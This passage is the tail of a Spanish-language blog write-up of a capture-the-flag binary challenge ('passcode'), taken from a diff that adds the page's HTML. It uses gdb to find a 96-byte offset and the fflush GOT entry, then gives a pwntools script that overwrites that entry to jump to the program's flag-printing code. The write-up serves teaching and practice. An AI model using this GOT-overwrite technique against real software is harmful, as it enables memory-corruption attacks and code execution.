+Starting program: /home/passcode/passcode 
+Toddler's Secure Login System 1.0 beta.
+enter you name : c4rta --&gt; Mi input
+
+Breakpoint 1, 0x08048643 in welcome ()
+(gdb) x/1s $ebp-0x70
+0xffa1a2c8:	"c4rta" --&gt; El valor que tiene
+(gdb) 
+</code></pre></div></div>
+
+<p>Ahora esta comprobado que en <code class="language-plaintext highlighter-rouge">ebp-0x70</code> esta la variable <code class="language-plaintext highlighter-rouge">name</code>.</p>
+
+<p>Asi que para sacar el desplazamiento para llegar a <code class="language-plaintext highlighter-rouge">passcode1</code> hacemos <code class="language-plaintext highlighter-rouge">0x70 - 0x10</code>, y esto nos da <code class="language-plaintext highlighter-rouge">96</code> es decimal</p>
+
+<h3 id="direccion-de-fflush">Direccion de fflush</h3>
+
+<p>Primero hay que mostrar el contenido de la funcion:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(gdb) disas fflush
+Dump of assembler code for function fflush@plt:
+   0x08048430 &lt;+0&gt;:	jmp    *0x804a004
+   0x08048436 &lt;+6&gt;:	push   $0x8
+   0x0804843b &lt;+11&gt;:	jmp    0x8048410
+End of assembler dump.
+</code></pre></div></div>
+
+<p>Vemos que la entrada de <code class="language-plaintext highlighter-rouge">fflush</code> esta con la direccion <code class="language-plaintext highlighter-rouge">0x804a004</code> y esta direccion la ocupamos ya que sobrescribiremos <code class="language-plaintext highlighter-rouge">fflush</code> para que llame a <code class="language-plaintext highlighter-rouge">/bin/cat flag</code> que esta en la direccion <code class="language-plaintext highlighter-rouge">0x080485e3</code></p>
+
+<h3 id="crafteando-el-exploit">Crafteando el exploit</h3>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">context</span><span class="p">.</span><span class="nf">update</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="sh">"</span><span class="s">i386</span><span class="sh">"</span><span class="p">,</span> <span class="n">os</span><span class="o">=</span><span class="sh">"</span><span class="s">linux</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">p</span> <span class="o">=</span> <span class="nf">process</span><span class="p">(</span><span class="sh">"</span><span class="s">./passcode</span><span class="sh">"</span><span class="p">)</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">A</span><span class="sh">'</span> <span class="o">*</span> <span class="mi">96</span>             <span class="c1"># desplazamiento para passcode
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="nf">p32</span><span class="p">(</span><span class="mh">0x0804a004</span><span class="p">)</span>      <span class="c1"># direccion de la entrada GOT de fflush
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="nb">str</span><span class="p">.</span><span class="nf">encode</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="mh">0x080485e3</span><span class="p">))</span>  <span class="c1"># direccion de bin/cat flag
+</span>
+<span class="nf">print</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="nf">recvline</span><span class="p">())</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="nf">print</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="nf">recvall</span><span class="p">())</span>
+</code></pre></div></div>
+<p>Y nos da la flag la cual es: <code class="language-plaintext highlighter-rouge">Sorry mom.. I got confused about scanf usage :(</code></p>
+
+<p>Eso ha sido todo, gracias por leer ❤</p>
+
+<p><img src="/assets/img/passcode/waifu.gif" alt=""></p>
+
+
+    </div>
+    
+    
+</article>
+<div class="post-nav">
+<a class="previous" href="/hackthebox/2023/01/16/htb-shoppy.html" title="HackTheBox Shoppy - NoSQL injection y Docker">HackTheBox Shoppy - NoSQL injection y...</a><a class="next" href="/2023/01/19/down-under-doTheLoop.html" title="DownUnderCTF Do The Loop - Analisis del espectrograma">DownUnderCTF Do The Loop - Analisis...</a>
+</div>
+<div class="post-related">
+      <div>Related Articles</div>
+      <ul>
+        <li><a class="post-link" href="/hackthebox/2023/06/12/htb-format.html" title="DownUnderCTF Do The Loop - Analisis del espectrograma">HackTheBox Format - LFI, Redis y Python format string</a></li>
+<li><a class="post-link" href="/explotacion%20binaria/2023/04/24/rop-emporium-callme.html" title="DownUnderCTF Do The Loop - Analisis del espectrograma">ROP emporium callme - Llamando multiples funciones</a></li>
+<li><a class="post-link" href="/maldev/2023/07/07/maldev-enumDesktopsW.html" title="DownUnderCTF Do The Loop - Analisis del espectrograma">Inyeccion de shellcodes via EnumDesktopsW()</a></li>
+<li><a class="post-link" href="/explotacion%20binaria/2022/07/30/got-overwrite.html" title="DownUnderCTF Do The Loop - Analisis del espectrograma">GOT overwrite con Format String</a></li>
+</ul>
+    </div>
+<div class="post-comments"></div></section>
+  
+<script src="https://unpkg.com/vanilla-back-to-top@7.2.1/dist/vanilla-back-to-top.min.js"></script>
+<script>addBackToTop({
+  diameter: 56,
+  backgroundColor: '#ff5100',
+  textColor: '#fff'
+})</script>
+  
+  
+</div>
+
+
+  </section>
+  <section class="sidebar" style="margin-left: 15px;">
+    <!-- Get sidebar items --></section>
+</div>
+
+<script src="https://unpkg.com/vanilla-back-to-top@7.2.1/dist/vanilla-back-to-top.min.js"></script>
+<script>addBackToTop({
+  diameter: 56,
+  backgroundColor: '#ff5100',
+  textColor: '#fff'
+})</script>
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div align="center" class="wrapper">
+    <div class="site-footer-inner">
+<div class="footer-col rss-subscribe">
+	  <font size="1" color="gray">
+	  <!--RSS SVG-->
+   	<svg aria-hidden="true" fill="#ff4e00" height="12" width="12" viewbox="0 0 16 16" version="1.1" data-view-component="true" class="octicon octicon-rss mr-1">
+    <path fill-rule="evenodd" d="M2.002 2.725a.75.75 0 01.797-.699C8.79 2.42 13.58 7.21 13.974 13.201a.75.75 0 11-1.497.098 10.502 10.502 0 00-9.776-9.776.75.75 0 01-.7-.798zM2 13a1 1 0 112 0 1 1 0 01-2 0zm.84-5.95a.75.75 0 00-.179 1.489c2.509.3 4.5 2.291 4.8 4.8a.75.75 0 101.49-.178A7.003 7.003 0 002.838 7.05z"></path>
+    </svg>
+	  <a href="/feed.xml" target="_blank"> RSS </a>订阅 |  
+    <!--提供支持-->
+    由 <a title="Jekyll is a simple, blog-aware, static site
+    generator." href="http://jekyllrb.com/" target="_blank">Jekyll</a> &amp; <a title="Yat, yet
+    another theme." href="https://github.com/jeffreytse/jekyll-theme-yat" target="_blank">Yat Theme</a>提供支持
+	  </font>
+</div>
+
+    <!--版权-->
+    <div>
+    <font size="1" color="gray">
+    Copyright © 2017-2023 <a href="https://github.com/ic4rta/">c4rta</a> All Rights Reserved
+    </font>
+</div>
+
+      <!--logo
+  <div>
+
+    <a href="https://github.com/vanhiupun" target="_blank">
+      <img src="https://visitor-badge.glitch.me/badge?page_id=vanhiupun.visitor-badge&right_color=Orange" alt="visitor" />
+    </a> 
+	    
+    <a href="https://github.com/vanhiupun/Vanhiupun.github.io/actions/workflows/jekyll.yml" target="_blank">
+        <img src="https://github.com/vanhiupun/Vanhiupun.github.io/actions/workflows/jekyll.yml/badge.svg" />
+    </a>
+      
+    <a href="https://github.com/vanhiupun/Vanhiupun.github.io/actions/workflows/codeql-analysis.yml" target="_blank">
+      <img src="https://github.com/vanhiupun/Vanhiupun.github.io/actions/workflows/codeql-analysis.yml/badge.svg">
+    </a> 
+      
+    <a href="https://github.com/vanhiupun/Vanhiupun.github.io" target="_blank">
+      <img src="https://www.codefactor.io/repository/github/vanhiupun/vanhiupun.github.io/badge" alt="CodeFactor" />
+    </a>
+    
+    <a href="https://codeclimate.com/github/vanhiupun/Vanhiupun.github.io/maintainability">
+      <img src="https://api.codeclimate.com/v1/badges/708da11ffb90a8f6f13b/maintainability" alt="maintainability" />
+    </a>
+    
+    <a href="https://rubygems.org/gems/jekyll-theme-yat" target="_blank">
+        <img src="https://badge.fury.io/rb/jekyll-theme-yat.svg"     alt="jekyll-theme-yat" />
+    </a> 
+    
+    <a href="https://github.com/vanhiupun" target="_blank">
+        <img src="https://img.shields.io/badge/Github%20Repository-222222?style=flat-square&logo=github&logoColor=ffffff" alt="Github" />
+    </a> 
+          
+    <a href="https://vanhiupun.github.io" target="_blank">
+        <img src="https://img.shields.io/badge/Github%20Page-222222?style=flat-square&logo=github&logoColor=ffffff" alt="Blog" />
+    </a> 
+          
+    <a href="mailto:fanxiaobin422@gmail.com" target="_blank">
+        <img src="https://img.shields.io/badge/Send%20me%20Gmail-EA4335?style=flat-square&logo=Gmail&logoColor=ffffff" alt="Gmail" />
+    </a> 
+          
+    <a href="https://github.com/vanhiupun/Vanhiupun.github.io/blob/c0c037532393ee2718892f87b200a0bbe33e7eb9/License" target="_blank">
+        <img src="https://img.shields.io/badge/License%20MIT-f2cb05?style=flat-square&logo=Mitsubishi&logoColor=222222" alt="MIT" />
+    </a>
+          
+    <a href="http://jekyllthemes.org/" target="_blank">
+        <img src="https://img.shields.io/badge/Jekyll%20Themes-f2cb05?style=flat-square&logo=Jekyll&logoColor=222222" alt="jekyll-themes" />
+    </a> 
+    
+    <a href="https://github.com/jeffreytse/jekyll-theme-yat" target="_blank">
+        <img src="https://img.shields.io/badge/Jekyll%C2%B7Theme%C2%B7Yat-f2cb05?style=flat-square&logo=github&logoColor=181717" alt="Jekyll-yat" />
+    </a> 
+      
+    <a href="https://raw.githubusercontent.com/vanhiupun/Vanhiupun.github.io/master/assets/images/img/zz.png" target="_blank">
+        <img src="https://img.shields.io/badge/GitHub%20Sponsors-EA4335?style=flat-square&logo=GitHub%20Sponsors&logoColor=222222" alt="/GitHub%20Sponsors" />
+    </a> 
+  </div>-->
+  </div>
+  </div>
+</footer>
+</body>
+</html><html>
+<script src="https://unpkg.com/vanilla-back-to-top@7.2.1/dist/vanilla-back-to-top.min.js"></script>
+<script>addBackToTop({
+  diameter: 56,
+  backgroundColor: '#ff5100',
+  textColor: '#fff'
+})</script>
+</html>
